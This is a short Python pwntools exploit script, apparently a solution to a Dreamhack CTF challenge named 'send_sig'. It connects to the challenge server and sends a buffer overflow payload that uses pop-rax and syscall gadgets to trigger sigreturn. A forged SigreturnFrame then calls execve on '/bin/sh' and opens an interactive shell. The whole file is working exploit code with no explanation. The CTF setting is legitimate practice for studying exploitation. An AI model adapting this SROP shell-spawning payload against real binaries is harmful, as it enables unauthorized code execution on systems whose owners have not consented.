from pwn import *

#r = process("./send_sig")
r = remote("host3.dreamhack.games", 9092)
context.arch = "amd64"

binsh = 0x402000
pop_rax = 0x4010ae
pop_rbp = 0x4010a4
syscall = 0x4010b0

payload = b"A"*8 + b"B"*8
payload += p64(pop_rax) + p64(15)
payload += p64(syscall)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rip = syscall
frame.rsi = 0
frame.rdx = 0

payload += bytes(frame)

r.recvuntil(b"Signal:")
r.send(payload)
r.interactive()